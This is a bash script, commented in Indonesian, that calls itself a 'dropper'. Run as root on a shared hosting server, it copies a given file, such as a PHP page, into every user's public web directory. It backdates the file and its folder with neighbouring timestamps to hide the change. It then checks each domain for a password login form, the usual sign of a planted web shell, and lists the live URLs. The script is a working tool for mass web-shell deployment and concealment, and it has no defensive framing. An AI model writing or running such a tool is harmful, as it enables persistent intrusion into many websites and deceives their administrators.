#!/bin/bash

# ============================================
# drop.sh - Dropper (htdocs)
# Usage: sudo drop.sh <filename>
# File harus satu directory dengan script ini
# ============================================


# Cek argument
if [ -z "$1" ]; then
    echo "Usage: sudo $0 <filename>"
    echo "Contoh: sudo $0 index.php"
    exit 1
fi

FILENAME="$1"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SOURCE_FILE="${SCRIPT_DIR}/${FILENAME}"

# Cek file source ada
if [ ! -f "$SOURCE_FILE" ]; then
    echo "File '${FILENAME}' tidak ditemukan di: ${SCRIPT_DIR}"
    exit 1
fi

# Fungsi: Ambil timestamp dari file lain di directory tujuan
get_reference_timestamp() {
    local target_dir="$1"
    local exclude_file="$2"
    local ref_time=""

    # Cari file lain di directory (bukan file yang baru di-drop)
    for f in "${target_dir}"/*; do
        [ ! -f "$f" ] && continue
        [ "$(basename "$f")" = "$(basename "$exclude_file")" ] && continue
        # Ambil timestamp modification dari file referensi
        ref_time=$(stat -c '%y' "$f" 2>/dev/null)
        if [ -n "$ref_time" ]; then
            echo "$ref_time"
            return 0
        fi
    done
    return 1
}

# Fungsi: Cari directory 'public' dengan kedalaman max 3 dari URL_DIR
# Kedalaman dihitung dari htdocs:
#   depth 1: htdocs/<URL>/public
#   depth 2: htdocs/<URL>/xxx/public
#   depth 3: htdocs/<URL>/xxx/yyy/public
find_public_dir() {
    local base_dir="$1"
    local max_depth=2  # find maxdepth relatif dari base_dir (URL_DIR)

    # Cek langsung di URL_DIR dulu (depth 1 dari htdocs)
    if [ -d "${base_dir}/public" ]; then
        echo "${base_dir}/public"
        return 0
    elif [ -d "${base_dir}/public_html" ]; then
        echo "${base_dir}/public_html"
        return 0
    fi

    # Search lebih dalam hingga depth 3 dari htdocs (depth 2 dari URL_DIR)
    local found
    found=$(find "$base_dir" -maxdepth "$max_depth" -type d \( -name "public" -o -name "public_html" \) 2>/dev/null | head -1)
    if [ -n "$found" ]; then
        echo "$found"
        return 0
    fi

    return 1
}

# Fungsi: Cek apakah domain aktif dengan membaca source
# Cek apakah ada type="password" name="password"></form>
check_domain() {
    local domain="$1"
    local file="$2"
    local url="http://${domain}/${file}"
    local body

    body=$(curl -s --max-time 5 -L "$url" 2>/dev/null)

    if [ -z "$body" ]; then
        echo "DOWN"
        return
    fi

    if echo "$body" | grep -q 'type="password"' && echo "$body" | grep -q 'name="password"' && echo "$body" | grep -q '</form>'; then
        echo "ACTIVE"
    else
        echo "DOWN"
    fi
}

# Fungsi: Drop file ke target
drop_file() {
    local source="$1"
    local target="$2"
    local owner_user="$3"
    local target_dir
    target_dir="$(dirname "$target")"

    # Copy file
    if cp "$source" "$target" 2>/dev/null; then
        # Set ownership sesuai user home
        chown "${owner_user}:${owner_user}" "$target" 2>/dev/null

        # Set permission normal
        chmod 644 "$target" 2>/dev/null

        # Touch -d mengikuti timestamp file lain di directory
        local ref_ts
        ref_ts=$(get_reference_timestamp "$target_dir" "$target")
        if [ -n "$ref_ts" ]; then
            touch -d "$ref_ts" "$target" 2>/dev/null
        fi

        # Verifikasi file terbaca
        if [ -f "$target" ] && [ -r "$target" ]; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

# ============================================
# MAIN: Scan semua directory di /home
# ============================================
for USER_HOME in /home/*/; do
    [ ! -d "$USER_HOME" ] && continue

    USER_NAME="$(basename "$USER_HOME")"
    HTDOCS_DIR="${USER_HOME}htdocs"
    PUBLIC_HTML_DIR="${USER_HOME}public_html"

    # Skip jika tidak ada htdocs dan tidak ada public_html
    if [ ! -d "$HTDOCS_DIR" ] && [ ! -d "$PUBLIC_HTML_DIR" ]; then
        continue
    fi

    TOTAL_USER=$((TOTAL_USER + 1))

    # 1. Jika ada directory htdocs, scan sub-directory URL di dalamnya
    if [ -d "$HTDOCS_DIR" ]; then
        for URL_DIR in "${HTDOCS_DIR}"/*/; do
            [ ! -d "$URL_DIR" ] && continue

            URL_NAME="$(basename "$URL_DIR")"
            TOTAL_DOMAIN=$((TOTAL_DOMAIN + 1))

            # Cari directory 'public' atau 'public_html' hingga kedalaman 3 dari htdocs
            PUBLIC_DIR=$(find_public_dir "$URL_DIR")

            if [ -n "$PUBLIC_DIR" ]; then
                TARGET_PATH="${PUBLIC_DIR}/${FILENAME}"

                if drop_file "$SOURCE_FILE" "$TARGET_PATH" "$USER_NAME"; then
                    STATUS=$(check_domain "$URL_NAME" "$FILENAME")
                    [ "$STATUS" = "ACTIVE" ] && echo "${URL_NAME}/${FILENAME}"

                    # Touch directory public/public_html agar timestamp sama
                    local_ref_ts=$(get_reference_timestamp "$PUBLIC_DIR" "$TARGET_PATH")
                    if [ -n "$local_ref_ts" ]; then
                        touch -d "$local_ref_ts" "$PUBLIC_DIR" 2>/dev/null
                    fi
                fi
            else
                TARGET_PATH="${URL_DIR}${FILENAME}"

                if drop_file "$SOURCE_FILE" "$TARGET_PATH" "$USER_NAME"; then
                    STATUS=$(check_domain "$URL_NAME" "$FILENAME")
                    [ "$STATUS" = "ACTIVE" ] && echo "${URL_NAME}/${FILENAME}"
                fi
            fi
        done
    fi

    # 2. Jika ada directory public_html langsung di under USER_HOME
    if [ -d "$PUBLIC_HTML_DIR" ]; then
        TOTAL_DOMAIN=$((TOTAL_DOMAIN + 1))
        URL_NAME="$USER_NAME"

        # Cari directory 'public' di dalam public_html
        PUBLIC_DIR=$(find_public_dir "$PUBLIC_HTML_DIR")

        if [ -n "$PUBLIC_DIR" ]; then
            TARGET_PATH="${PUBLIC_DIR}/${FILENAME}"

            if drop_file "$SOURCE_FILE" "$TARGET_PATH" "$USER_NAME"; then
                STATUS=$(check_domain "$URL_NAME" "public/${FILENAME}")
                [ "$STATUS" = "ACTIVE" ] && echo "${URL_NAME}/public/${FILENAME}"

                local_ref_ts=$(get_reference_timestamp "$PUBLIC_DIR" "$TARGET_PATH")
                if [ -n "$local_ref_ts" ]; then
                    touch -d "$local_ref_ts" "$PUBLIC_DIR" 2>/dev/null
                fi
            fi
        else
            TARGET_PATH="${PUBLIC_HTML_DIR}/${FILENAME}"

            if drop_file "$SOURCE_FILE" "$TARGET_PATH" "$USER_NAME"; then
                STATUS=$(check_domain "$URL_NAME" "$FILENAME")
                [ "$STATUS" = "ACTIVE" ] && echo "${URL_NAME}/${FILENAME}"

                local_ref_ts=$(get_reference_timestamp "$PUBLIC_HTML_DIR" "$TARGET_PATH")
                if [ -n "$local_ref_ts" ]; then
                    touch -d "$local_ref_ts" "$PUBLIC_HTML_DIR" 2>/dev/null
                fi
            fi
        fi
    fi
done
